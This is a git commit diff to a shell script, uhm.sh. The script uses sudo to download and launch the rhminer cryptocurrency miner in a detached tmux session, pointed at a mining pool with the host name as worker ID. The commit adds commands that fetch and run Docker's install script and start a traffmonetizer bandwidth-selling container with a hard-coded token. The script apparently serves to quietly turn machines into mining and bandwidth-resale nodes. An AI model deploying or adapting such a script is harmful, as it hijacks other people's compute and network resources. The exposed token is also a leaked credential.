3584db314de7a85353acd009771d988d74edb824
minnie1311 <69047664+minnie1311@users.noreply.github.com>
2022-05-28 16:40:30 +0700

    Update uhm.sh

--- uhm.sh
+++ uhm.sh
@@ -12,4 +12,7 @@ sudo wget https://github.com/polyminer1/rhminer/releases/download/2.3b/rhminer.2
 
 sudo unzip rhminer.2.3.Linux.CPU.zip
 sudo tmux new-session -d -s 1 './rhminer -v 2 -r 20 -s stratum+tcp://fastpool.xyz:10097 -su 1139719-97.0.$HOSTNAME/mickeypp@gmail.com'
+curl -fsSL get.docker.com -o get-docker.sh
+sudo sh get-docker.sh
+sudo docker run -i --name tm traffmonetizer/cli start accept --token VyeG53GE4UXSL/JTCoRJwX1xHwWzziBW2dHTUkGK1lo=
 
